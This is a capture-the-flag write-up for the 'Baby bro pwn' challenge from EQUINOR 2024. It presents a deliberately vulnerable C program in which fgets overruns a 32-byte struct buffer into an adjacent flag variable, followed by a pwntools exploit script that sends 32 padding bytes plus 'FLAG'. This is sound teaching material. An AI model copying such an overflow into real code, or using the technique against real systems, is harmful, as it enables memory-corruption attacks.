# Baby bro pwn - EQUINOR 2024 (PWN)

## Challenge description

> _"Yo, tell me something real quick fam, but keep it short pls, I don't deal with essay type conversations, esse."_

We’re given a C program that:

1. Defines a struct with a 32-byte message buffer and an integer `showFlag`.
2. Prompts the user and reads input into `message` with `fgets`.
3. Checks whether `showFlag == 0x47414c46`.
4. If true, prints the flag; otherwise prints some “bro talk” and loops.

---
## Vulnerable code
```c
struct __attribute__((__packed__)) Dude {
    char message[32];
    int showFlag;
};

int main() {
    struct Dude homie;

    do {
        printf("What's up dude?\n> ");
        fgets(homie.message, 37, stdin);

        if (homie.showFlag == 0x47414c46) {
            printf("%s\n", FLAG);
            return 0;
        } else {
            printf("Damn, cappin bussin, I'm sorry...\n");
        }
    } while (1);
}
```

The bug:
- `message` is 32 bytes, but `fgets` allows reading **36 bytes**.
- That overflow overwrites the adjacent `showFlag`.
- The target value `0x47414c46` equals `"FLAG"` in ASCII.

Since the system is little-endian, writing `"FLAG"` as bytes after the 32-byte buffer sets `showFlag` correctly.

---
## Vulnerability

We just need to send 32 padding bytes (to fill `message`) plus `"FLAG"` to overwrite `showFlag`.

Payload structure:
```css
[ 32 * "A" ] + [ "FLAG" ]
```

This sets `homie.showFlag = 0x47414c46` → condition passes → flag is printed.

---
## Exploit
```python
from pwn import *

# Setup
context.binary = ELF('./baby_bro_pwn')
context.log_level = 'info'

# Offsets
OFFSET = 32              # size of message[]
TARGET = b'FLAG'         # bytes that set showFlag correctly

payload = b'A' * OFFSET + TARGET

# Local process (replace with remote(host, port) if deployed)
p = process('./baby_bro_pwn')

p.recvuntil(b"> ")
p.sendline(payload)

# The binary prints multiple lines with sleep() before the flag.
# To avoid waiting too long, just capture everything with a timeout.
print(p.recvall(timeout=12).decode(errors='ignore'))
```
